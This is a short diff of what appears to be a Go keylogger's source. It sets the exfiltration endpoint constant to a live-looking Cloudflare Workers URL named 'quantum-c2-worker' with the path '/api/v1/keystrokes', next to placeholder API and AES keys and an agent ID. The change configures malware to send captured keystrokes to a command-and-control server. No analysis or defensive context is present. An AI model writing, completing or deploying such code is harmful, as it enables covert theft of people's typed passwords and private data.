@@ -23,7 +23,7 @@ import (
 )
 
 const (
-	workerURL      = "https://REPLACE_WITH_WORKER.workers.dev/api/v1/keystrokes"
+	workerURL      = "https://quantum-c2-worker.ns8pc1.workers.dev/api/v1/keystrokes"
 	apiKey         = "REPLACE_WITH_API_KEY"
 	aesKey         = "REPLACE_WITH_32_BYTE_AES_KEY_1234567890123456"
 	agentID        = "agent-001"
